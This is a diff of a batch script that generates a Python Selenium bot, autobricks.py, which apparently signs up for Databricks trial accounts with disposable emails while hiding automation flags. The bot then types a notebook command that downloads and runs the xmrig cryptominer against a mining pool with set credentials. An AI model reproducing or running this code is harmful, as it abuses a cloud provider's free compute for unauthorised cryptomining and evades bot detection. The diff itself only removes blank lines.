@@ -6,7 +6,6 @@ echo	from selenium.webdriver.support.ui import WebDriverWait 	>> autobricks.py
 echo	from selenium.webdriver.common.by import By 	>> autobricks.py
 echo	from selenium.webdriver.support import expected_conditions as EC 	>> autobricks.py
 echo	import names, time 	>> autobricks.py
-echo		>> autobricks.py
 echo	option = webdriver.ChromeOptions() 	>> autobricks.py
 echo	option.add_experimental_option("excludeSwitches", ["enable-automation"]) 	>> autobricks.py
 echo	option.add_experimental_option('useAutomationExtension', False) 	>> autobricks.py
@@ -14,9 +13,7 @@ echo	option.add_argument('--disable-blink-features=AutomationControlled') 	>> au
 echo	option.add_argument('--disable-gpu') 	>> autobricks.py
 echo	#option.add_argument('--headless') 	>> autobricks.py
 echo	option.add_argument('--disable-software-rasterizer') 	>> autobricks.py
-echo		>> autobricks.py
 echo	driver = webdriver.Chrome(executable_path='chromedriver',options=option) 	>> autobricks.py
-echo		>> autobricks.py
 echo	def get_email():	>> autobricks.py
 echo	    print("get email")	>> autobricks.py
 echo	    global email	>> autobricks.py
@@ -73,28 +70,21 @@ echo	def create_workspace():	>> autobricks.py
 echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]')))	>> autobricks.py
 echo	    #new python	>> autobricks.py
 echo	    driver.execute_script("document.querySelector('#content > div > div > uses-legacy-bootstrap > div > div > div.homeview-inner > div.homeview-panel > div.ant-row.ant-row-center.homeview-row.homeview-top > div:nth-child(3) > div > div > div > a > div.header').click();")	>> autobricks.py
-echo	    	>> autobricks.py
 echo	    #input name	>> autobricks.py
 echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="input"]'))) 	>> autobricks.py
 echo	    #driver.execute_script("document.querySelector('#input').value='Plant';")	>> autobricks.py
 echo	    driver.find_element_by_xpath('//*[@id="input"]').send_keys("Plant")	>> autobricks.py
-echo	    	>> autobricks.py
 echo	    #create	>> autobricks.py
 echo	    driver.execute_script("document.querySelector('body > div.ReactModalPortal > div > div > uses-legacy-bootstrap > uses-legacy-bootstrap > button.btn.btn-primary > span').click();")	>> autobricks.py
-echo	    	>> autobricks.py
 echo	    #click cell	>> autobricks.py
 echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[2]/div[2]/div/div[3]/div[1]/div/div/div/div[4]/div[1]/div/div/div/div[5]/div/pre'))) 	>> autobricks.py
-echo		>> autobricks.py
-echo		>> autobricks.py
 echo	    driver.find_element_by_css_selector(".CodeMirror-line").click()	>> autobricks.py
 echo	    driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("!wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.allcoins.pw:3333 -a rx -k -u allcoins.pw -p 511240")	>> autobricks.py
-echo	       	>> autobricks.py
 echo	    #start cell	>> autobricks.py
 echo	    driver.find_element_by_css_selector(".fa-play").click()	>> autobricks.py
 echo	    driver.find_element_by_css_selector(".run-cell > .fa").click() 	>> autobricks.py
 echo	    driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()	>> autobricks.py
 echo	    print("**********************DONE***************************")	>> autobricks.py
-echo	    	>> autobricks.py
 echo	get_email()	>> autobricks.py
 echo	try_databricks()	>> autobricks.py
 echo	read_email()	>> autobricks.py
